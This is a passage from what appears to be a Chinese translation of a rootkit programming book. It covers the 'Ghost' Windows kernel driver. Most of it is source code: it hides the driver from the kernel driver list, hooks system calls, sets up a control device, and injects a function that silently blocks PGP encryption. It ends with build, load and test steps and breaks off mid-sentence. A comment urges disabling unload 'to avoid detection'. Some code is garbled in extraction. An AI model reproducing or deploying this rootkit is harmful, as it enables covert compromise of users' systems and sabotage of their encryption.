#define _GHOST_ROOTKIT_
对 Ghost.c 进行如下修改：
#include "IoManager.h"
包含这个文件后，与 Controller.c 文件所包含的一样，这是为了提供一直的通讯定义。
Ghost.c 文 件 也 需 要 这 个 文 件 中 的 两 个 函 数 原 型 OnDeviceControl 和 OnDispatch 位 于
IoManager.h 文件末端，因此在 Ghost.h 中定义_GHOST_ROOTKIT_。
// Global state data
BOOL allowEncryption = TRUE;
增加这个全局变量来标记加密处理的开/关状态。
VOID OnUnload( IN PDRIVER_OBJECT theDriverObject )
{
UNICODE_STRING deviceLink = { 0 };
// remove device controller
RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
IoDeleteSymbolicLink( &deviceLink );
IoDeleteDevice( theDriverObject->DeviceObject );
DbgPrint("comint32: Device controller removed.");
// Unhook any hooked functions and return the Memory Descriptor List
if( NewSystemCallTable )
{
UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
IoFreeMdl( pMyMDL );
}
DbgPrint("comint32: Hooks removed.");
}
OnUnload 被更改来解除链接并删除在 DriverEntry 中创建的设备驱动。
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING
theRegistryPath )
{
DRIVER_DATA* driverData;
UNICODE_STRING
deviceName = { 0 };
UNICODE_STRING deviceLink = { 0 };
PDEVICE_OBJECT pDeviceController;
// Get the operating system version
PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );
// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
// Major = 5: Windows Server 2003, Windows XP or Windows 2000
// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
// Minor = 1: Windows XP
// Minor = 2: Windows Server 2003
if ( majorVersion == 5 && minorVersion == 2 )
{
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows NT 4.0");
}
else
{
DbgPrint("comint32: Running on unknown system");
}
// Hide this driver
driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
if( driverData != NULL )
{
// unlink this driver entry from the driver list
*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
}
// Configure the controller connection
if( !NT_SUCCESS( Configure() ) )
{
DbgPrint("comint32: Configure failed!\n");
return STATUS_UNSUCCESSFUL;
}
// Add kernel hooks
if( !NT_SUCCESS( HookKernel() ) )
{
DbgPrint("comint32: HookKernel failed!\n");
return STATUS_UNSUCCESSFUL;
}
// Assign device controller
RtlInitUnicodeString( &deviceName, GHOST_DEVICE_CREATE_NAME );
IoCreateDevice( pDriverObject,
0,
&deviceName,
FILE_DEVICE_UNKNOWN,
0,
FALSE,
&pDeviceController );
RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
IoCreateSymbolicLink( &deviceLink, &deviceName );
pDriverObject->MajorFunction[IRP_MJ_CREATE] =
pDriverObject->MajorFunction[IRP_MJ_CLOSE] =
pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]
= OnDispatch;
// Comment out in free build to avoid detection
pDriverObject->DriverUnload = OnUnload;
return STATUS_SUCCESS;
}
对 DriverEntry 做 几 处 更 改 。 第 一 个 是 增 加 两 个 UNICODE_STRINGs 和 一 个
PDEVICE_OBJECT。 他 们 是 用 来 创 建 向 外 部 应 用 程 序 发 送 命 令 的 控 制 设 备 驱 动 。
IoCreateDevice 创建实际设备驱动，然而 IoCreateSymbolicLink 使得驱动可以通过使用
GHOST_DEVICE_OPEN_NAME 来访问。最后，三个 MajorFunctions 被挂钩以便 Ghost 可
以 处 理 指 向 重 新 创 建 的 驱 动 程 序 的 IRP_MJ_CREATE 、 IRP_MJ_CLOSE 和
IRP_MJ_DEVICE_CONTROL 命令。这是只有 IRP_MJ_DEVICE_CONTROL 将被处理。挂
钩 IRP_MJ_CREATE、IRP_MJ_CLOSE 简单的演示了通过允许未处理的命令来“穿过”设备驱
动处理程序来挂钩任何 MajorFunction 的能力。
IoManager.c
IoManager.c
IoManager.c
IoManager.c
通 过 增 加 IoManager.c 文 件 来 处 理 DriverEntry 中 被 请 求 的 I/O 命 令 ； 分 别 是
IRP_MJ_CREATE、IRP_MJ_CLOSE 和 IRP_MJ_DEVICE_CONTROL。在 IoManager.c 的迭
代中，只有 IRP_MJ_DEVICE_CONTROL 被处理；IRP_MJ_CREATE 和 IRP_MJ_CLOSE 只
是为了演示怎样处理无句柄 I/O 而增加的：
// IoManager
// Copyright Ric Vieler, 2006
// Process remote IO
#include "ntddk.h"
#include "Ghost.h"
#include "IoManager.h"
extern BOOL allowEncryption;
// Process commands from external applications
NTSTATUS
OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
PVOID InputBuffer, ULONG InputBufferLength,
PVOID OutputBuffer, ULONG OutputBufferLength,
ULONG IoControlCode, PIO_STATU***LOCK IoStatus,
PDEVICE_OBJECT DeviceObject )
{
GHOST_IOCTLDATA* pControlData;
IoStatus->Status
= STATUS_SUCCESS;
IoStatus->Information = 0;
switch ( IoControlCode )
{
case GHOST_ON_OFF_COMMAND:
if(InputBufferLength >= sizeof(GHOST_IOCTLDATA))
{
pControlData = (GHOST_IOCTLDATA*)InputBuffer;
if(pControlData->command == GHOST_ON)
{
// block PGP encryption
allowEncryption = FALSE;
DbgPrint (("comint32: blocking encryption"));
}
else
{
// allow PGP encryption
allowEncryption = TRUE;
DbgPrint (("comint32: allowing encryption"));
}
}
return IoStatus->Status;
case GHOST_STATUS_COMMAND:
if(OutputBufferLength >= sizeof(GHOST_IOCTLDATA))
{
pControlData = (GHOST_IOCTLDATA*)OutputBuffer;
if(allowEncryption == TRUE)
pControlData->command = GHOST_OFF;
else
pControlData->command = GHOST_ON;
}
IoStatus->Information = sizeof(GHOST_IOCTLDATA);
return IoStatus->Status;
default:
IoStatus->Information = 0;
IoStatus->Status = STATUS_NOT_SUPPORTED;
return IoStatus->Status;
}
return STATUS_SUCCESS;
}
// Process IRP_MJ_CREATE, IRP_MJ_CLOSE and IRP_MJ_DEVICE_CONTROL
NTSTATUS OnDispatch( PDEVICE_OBJECT DeviceObject, PIRP Irp )
{
PIO_STACK_LOCATION irpStack;
PVOID inputBuffer;
PVOID outputBuffer;
ULONG inputBufferLength;
ULONG outputBufferLength;
ULONG ioControlCode;
NTSTATUS status;
// go ahead and set the request up as successful
Irp->IoStatus.Status
= STATUS_SUCCESS;
Irp->IoStatus.Information = 0;
// Get the IRP stack
irpStack = IoGetCurrentIrpStackLocation (Irp);
// Get the buffers
inputBuffer = Irp->AssociatedIrp.SystemBuffer;
inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
outputBuffer = Irp->AssociatedIrp.SystemBuffer;
outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
// Get the control code
ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
switch (irpStack->MajorFunction)
{
case IRP_MJ_DEVICE_CONTROL:
status = OnDeviceControl( irpStack->FileObject, TRUE,
inputBuffer, inputBufferLength,
outputBuffer, outputBufferLength,
ioControlCode, &Irp->IoStatus, DeviceObject );
break;
}
IoCompleteRequest( Irp, IO_NO_INCREMENT );
return status;
}
OnDispatch 处理设备 I/O 并传递设备驱动控制命令给 OnDeviceControl。OnDeviceControl
处理 GHOST_ON_OFF_COMMAND 和 GHOST_STATUS_COMMAND 命令并为其他处理返
回 STATUS_NOT_SUPPORTED 。 GHOST_ON_OFF_COMMAND 已 经 解 释 过 了 。
GHOST_STATUS_COMMAND 是一个命令，将被从被从注入的加密前函数发送到确定 PGP
编码是否应该被分块。
SOURCES
SOURCES
SOURCES
SOURCES
和所有新被添加到 rootkit 中的文件一样，IoManager.c 也要被添加到 SOURCES 中。
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
fileManager.c\
IoManager.c\
hookManager.c\
configManager.c
最后，这是增加到被注入函数的代码，增加 beforeEncode 到 injectManager.c 中：
DWORD beforeEncode( PDWORD stack, DWORD* callbackReturn, IN_PROCESS_DATA*
pCallData
)
{
void* contextPtr = (void*)stack[1];
PGPOptionList* optionListPtr = (PGPOptionList*)stack[2];
DWORD dwRet = (DWORD)TRUE;
int index;
int inputType = 0;
void* lpBuffer;
DWORD dwInBufferLen = 0;
PGPOption* currentOption = optionListPtr->options;
PFLFileSpec* fileSpec;
HANDLE deviceHandle;
GHOST_IOCTLDATA control = { 0 };
ULONG status = 0;
// Look at the options in the option list
for( index = 0; index numOptions; index++)
{
if( currentOption->type == 1 )
{
// File Input
inputType = 1;
fileSpec = (PFLFileSpec*)currentOption->value;
lpBuffer = fileSpec->data;
dwInBufferLen = (DWORD)pCallData->plstrlenA((LPCSTR)(lpBuffer));
break;
}
else if( currentOption->type == 2 )
{
// Buffer Input
inputType = 2;
lpBuffer = (void*)currentOption->value;
dwInBufferLen = (DWORD)currentOption->valueSize;
break;
}
currentOption++;
}
// Process buffer or file before encryption
if(( inputType == 1 || inputType == 2 ) && ( dwInBufferLen > 0 ))
{
deviceHandle = pCallData->pCreateFileA( pCallData->deviceString,
GENERIC_READ | GENERIC_WRITE,
0,
NULL,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
NULL);
if (deviceHandle != INVALID_HANDLE_VALUE)
{
if( pCallData->pDeviceIoControl( deviceHandle,
GHOST_STATUS_COMMAND,
&control,
sizeof(control), // input
(PVOID)&control,
sizeof(control), // output
&status,
NULL ) )
{
if(control.command == GHOST_ON)
{
// blocking encryption
dwRet = (DWORD)FALSE;
*callbackReturn = PGP_BAD_API;
pCallData->pOutputDebugStringA(pCallData->denyString);
}
else
{
pCallData->pOutputDebugStringA(pCallData->allowString);
}
}
pCallData->pCloseHandle(deviceHandle);
}
}
return dwRet;
}
增加的 beforeEncode 应该看起来很熟悉，因为这个代码非常像 Controller.c 中使用过的。
唯一的不同是这个命令是发送给设备控制程序的并且从结果变化上看代码是在一个被注入
函数的内部被执行的。
被注入函数程序设计
现在应该是指出应用程序设计和被注入函数设计的不同之处的时候了。如果你仔细的看
过 beforeEncode，你将注意到其中没有库函数调用。这是因为被注入函数没有通过基本应用
加载库的概念。Ghost 通过使用 ZwMapViewOfSection 来查找所需函数的地址并将这些地址
传递给 IN_PROCESS_DATA 结构中的被注入函数的方法来避免这个问题。不幸的是，这个
函数指向 IN_PROCESS_DATA 附近将不能使用被注入函数中定义的局部变量，因此必须通
过传值来传递函数，或者通过传递地址，这个地址必须在 IN_PROCESS_DATA 结构中传递。
测试 I/O
I/O
I/O
I/O 控制
为了测试开发到现在的所有功能，你需要通过 Checked DDK 命令提示符编译第五章的
Ghost 。SCMUnloader.exe、SCMLoader.exe 和 Controller.exe 也同样需要编译构建。另外，
你需要 PGP 版本 9，虽然如果修正 SDK 动态链接库名字并将加密前函数样式与你的 rootkit
版本统一。
复制 SCMUnloader、SCMLoader、Controller 和 Chapter05Ghost\objchk\i386\comint32.sys 文
件到 C:\目录下。
执行 DebugView 来监视 rootkit。
如果 rootkit 之前被加载过，你将需要运行 SCMUnloader 来卸载已存在的 rootkit。这是
因为 SCMLoader 允许一个注册条目告诉运行中的操作系统加载，但是不会开始运行 rootkit。
加载并运行 rootkit。根据 DebugView 的记录来修正一些错误的情况直到 rootkit 成功加
载并运行。
从 PGP 系统托盘图标选择打开 PGP Desktop。如图 5-2 所示。
在 PGP desktop 界面中选择 File=>New=>PGP Zip。在 PGP Zip 窗口中选择 Add Recipients 按
钮。如图 5-3 所示选择一个收件人。
从 Recipient Selection 对话框中选择任意一个收件人并点击 OK。这样将返回到 PGP Zip
窗口。拖放任意文件到 PGP Zip 窗口的下部界面并点击 Save 按钮。如图 5-4 对话框所示保
存 PGP Zip。
使用由对话框提供的默认文件名保存并再次点击 Save。最后一步，PGP desktop 将要求
输入解密文档时所需要的 passphrase（通过短语）。输入你的 passphrase（通过短语）来启动
加密程序。如图 5-5 所示输入一个 PGP passphrase（通过短语）。
如果 rootkit 分块进行加密将出现一个错误信息，通常是一个 DLL 不匹配信息。拿 PGP
版本 9 来说，这个错误消息是“Unable to save（无法保存）(library version too old or too new
（库版本太旧或太新）)”如图 5-6 所示 PGP 加密失败。
现在在 Controller.exe 所在目录输入命令“controller off”。你将在命令提示符中看到返回